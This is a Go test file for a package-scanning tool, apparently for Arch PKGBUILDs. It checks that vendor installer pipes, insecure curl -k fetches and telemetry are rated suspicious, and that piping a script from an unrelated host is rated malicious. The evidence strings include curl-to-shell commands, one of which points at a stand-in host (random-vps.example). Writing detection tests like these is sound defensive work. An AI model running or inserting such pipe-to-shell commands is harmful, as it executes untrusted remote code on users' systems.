package scan

import "testing"

// "Dangerous" and "malware" are different verdicts, and the checklist needs to
// be able to say so. 1panel-stable-bin pipes its own vendor's installer into a
// shell, downloads with curl -k, and phones home with an install counter. Every
// one of those is worth reporting; none of them means "this package is trying
// to hurt you", and MALICIOUS says exactly that.
func TestDangerousIsNotMalicious(t *testing.T) {
	v := VerdictFromChecks([]Check{
		{ID: "unpinned_upstream_installer", Triggered: true, File: "PKGBUILD",
			Evidence: "curl -sfL https://resource.fit2cloud.com/installation-log.sh | sh"},
		{ID: "telemetry", Triggered: true, File: "remote-fetch/x.sh",
			Evidence: "community.fit2cloud.com/installation-analytics"},
		{ID: "insecure_tls_fetch", Triggered: true, File: "PKGBUILD",
			Evidence: "curl -LOk -o $pkg $url"},
		{ID: "network_fetch_outside_sources", Triggered: true, File: "PKGBUILD",
			Evidence: "curl -LOk"},
		{ID: "packaging_policy_violation", Triggered: true, File: "PKGBUILD",
			Evidence: "source=() sha256sums=()"},
	})
	if v.Verdict != "SUSPICIOUS" {
		t.Errorf("verdict = %q, want SUSPICIOUS: dangerous, not malware", v.Verdict)
	}
	if len(v.Findings) != 5 {
		t.Errorf("all five findings must still be reported, got %d", len(v.Findings))
	}
}

// Piping a script from a host with no claim to the package is still malicious:
// the script's author is not the software's author.
func TestUnrelatedHostPipeIsStillMalicious(t *testing.T) {
	v := VerdictFromChecks([]Check{
		{ID: "pipe_to_shell", Triggered: true, File: "PKGBUILD",
			Evidence: "curl -sL http://random-vps.example/i.sh | sh"},
	})
	if v.Verdict != "MALICIOUS" {
		t.Errorf("verdict = %q, want MALICIOUS", v.Verdict)
	}
}

// The three new ids must exist at warning tier.
func TestDangerousSiblingsAreWarnings(t *testing.T) {
	for _, id := range []string{"unpinned_upstream_installer", "telemetry", "insecure_tls_fetch"} {
		d, ok := checkCatalog[id]
		if !ok {
			t.Errorf("%s is missing", id)
			continue
		}
		if d.Severity != "warning" {
			t.Errorf("%s severity = %q, want warning", id, d.Severity)
		}
	}
}
